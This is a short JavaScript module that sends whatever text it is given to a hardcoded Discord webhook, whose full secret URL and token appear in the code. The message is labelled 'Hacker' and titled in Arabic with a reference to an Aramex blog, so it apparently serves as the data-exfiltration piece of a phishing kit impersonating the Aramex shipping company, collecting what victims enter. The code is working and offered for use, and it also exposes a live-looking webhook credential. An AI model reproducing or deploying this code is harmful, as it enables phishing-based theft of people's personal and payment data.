import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1328002740940574803/N4Dz_5Kr6rSQmBJpcqQUUIiYSlUvba0PXo69pI3WaBsoVC1fskB9-d4RQuynpb6Ee7lk",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
